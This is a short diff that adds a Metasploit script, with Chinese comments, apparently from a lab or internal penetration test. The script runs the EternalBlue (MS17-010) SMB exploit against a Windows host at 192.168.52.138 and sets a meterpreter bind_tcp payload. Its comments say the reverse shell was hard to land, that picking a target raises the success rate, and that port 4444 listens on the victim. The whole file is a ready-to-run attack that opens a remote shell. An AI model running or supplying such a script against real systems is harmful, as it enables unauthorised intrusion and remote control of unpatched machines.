@@ -1,0 +1,10 @@
+use exploit/windows/smb/ms17_010_eternalblue
+# set payload windows/x64/meterpreter/reverse_tcp # 反向不好打
+set payload windows/x64/meterpreter/bind_tcp
+set rhosts 192.168.52.138
+show targets
+# set target 3
+run
+
+# targets 选一下能提高成功率
+# LPORT     4444   这是138监听的端口，bind_tcp正向连接, 
